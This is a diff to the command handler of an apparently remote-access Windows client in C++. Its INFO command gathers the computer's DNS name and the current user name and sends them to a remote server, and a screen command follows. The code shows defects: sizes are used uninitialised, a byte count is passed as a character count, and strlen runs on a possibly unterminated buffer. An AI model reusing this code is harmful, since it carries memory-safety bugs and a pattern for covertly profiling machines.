@@ -145,22 +145,27 @@ DWORD Client::TcpThread(const LPVOID param) {
     case Command::kINFO: {
       DWORD domain_size;
       DWORD user_size;
-      TCHAR buf[MAX_PATH];
-      if (GetComputerNameEx(ComputerNameDnsFullyQualified, buf, &domain_size) ==
+      wchar_t buf[MAX_PATH];
+      if (GetComputerNameExW(ComputerNameDnsFullyQualified, buf, &domain_size) ==
         0) {
-        memset(buf, 0xff, sizeof(TCHAR) * domain_size);
-        GetComputerNameEx(ComputerNameDnsFullyQualified, buf, &domain_size);
+        memset(buf, 0xff, sizeof(wchar_t) * domain_size);
+        GetComputerNameExW(ComputerNameDnsFullyQualified, buf, &domain_size);
       }
       buf[domain_size] = L'.';
-      TCHAR *user_offset = buf + (domain_size) + 1;
-      if (GetUserName(user_offset, &user_size) == 0) {
-        memset(user_offset, 0xff, sizeof(TCHAR) * user_size);
-        GetUserName(user_offset, &user_size);
+      wchar_t *user_offset = buf + (domain_size) + 1;
+      if (GetUserNameW(user_offset, &user_size) == 0) {
+        memset(user_offset, 0xff, sizeof(wchar_t) * user_size);
+        GetUserNameW(user_offset, &user_size);
       }
 
-      const DWORD size = (domain_size + user_size) * sizeof(TCHAR);
-      while (!client->Send(reinterpret_cast<const char *>(&size), 4)) {}
-      while (!client->Send(reinterpret_cast<char *>(&buf), size)) {}
+      const DWORD size = (domain_size + user_size) * sizeof(wchar_t);
+      const int utf_size = WideCharToMultiByte(CP_UTF8, 0, buf, size, nullptr, 0, nullptr, nullptr);
+      char *utf_string = new char[utf_size];
+      WideCharToMultiByte(CP_UTF8, 0, buf, size, utf_string, utf_size, nullptr, nullptr);
+      size_t final_size = std::strlen(utf_string);
+      while (!client->Send(reinterpret_cast<const char *>(&final_size), 4)) {}
+      while (!client->Send(utf_string, final_size)) {}
+      delete[] utf_string;
       break;
     }
     case Command::kSCREEN: {
